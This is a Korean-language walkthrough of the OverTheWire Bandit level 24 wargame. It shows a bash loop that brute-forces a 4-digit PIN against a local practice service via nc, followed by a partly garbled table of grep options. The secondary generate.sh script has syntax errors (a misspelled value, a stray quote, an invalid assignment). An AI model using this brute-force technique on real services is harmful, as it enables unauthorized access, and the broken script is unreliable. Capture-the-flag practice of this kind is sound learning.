# Bandit Level 24

## 1. 목표
- 네트워크 소켓 제어 학습
- 무차별 대입공격의 기본 개념 학습
- 무차별 대입공격 코드 작성
- 30002 포트에서 실행 중인 서비스에 접속하여 bandit25 비밀번호 획득
- 현재 레벨 비밀번호와 pin을 nc 포트에 전송하여 다음레벨의 비밀번호 획득

## 2. 문제 분석
- bandit24 비밀번호와 4자리 숫자 pin 0000~9999사이에있는 값을 한 줄로 전송해야 한다.
- 핵심은 반복문으로 0000~9999번까지 돌려서 딱 하나의 pin을 알아낸다음 전송해야한다. ,즉 0000부터 9999까지 값을 1개씩 다 대입해보는 무차별 대입 코드를 만들어야한다.
- cron파일을 확인해 파이썬 코드 확인

무차별 대입 코드
```bash
for i in {0000..9999}; do echo "$PASS $i"; done
```

파이프를 이용하여 비밀번호 전송
```bash
# 본인의 bandit24 실제 비밀번호를 입력하고 아래 한 줄 실행
PASS="bandit24_실제비밀번호"

for i in {0000..9999}; do echo "$PASS $i"; done | nc localhost 30002 | grep -v "Wrong!"
```
- 10000개중 9999개의 요청이 Wrong이고 단 하나의 요청이 정답이므로 grep -v을 사용하여 Wrong인 응답을 제외하고 출력한다.

 generate.sh 파일을 만들어 코드를 입력하고 실행권한을 주고 파이프로 실행 시켜도 된다.

- generate.sh

```bash
pass = "bandi24_password"
for i in {0000..9999}
do
    echo $pass $i"
done
```
실행권한 부여
 - chmod +x generate.sh
```bash
./generate | nc localhost 30002 | grep -v "Wrong!
```

## 3. 사용 명령어
- nc localhost 30002
- grep -v
- |

## 4. 명령어 분석

- grep

|옵션|옵션명|설명예시|
|----|----| ----|
|-i| --ignore-case| 대소문자 구분 없이 검색grep -i "error" log.txt|
|-v|--invert-match|패턴이 포함되지 않은 행만 출력 (반대 검색)grep -v "Wrong!" result.txt|
|-r|--recursive|하위 디렉터리까지 재귀적으로 모든 파일 검색grep -r |"password" /etc/|
|-n|--line-number|일치하는 행의 줄 번호(Line Number) 함께 출력   "grep -n "main" main.c"|
|-c|--count|일치하는 행의 총 개수만 출력|grep -c "200 OK" access.log
|-l|--files-with-matches|일치하는 내용이 있는 파일명만 출력grep -rl "TODO" ./src-w--word-regexp정확히 단어 단위로 일치하는 경우만 검색grep -w "is" file.txt (this 제외)
|-E|--extended-regexp|확장 정규표현식(ERE) 사용 (\|, \\+ 등 처리)"`grep -E "cat-o--only-matching일치하는 행 전체가 아니라 매칭된 문자열만 출력grep -o "http://[^ ]*" file.txt
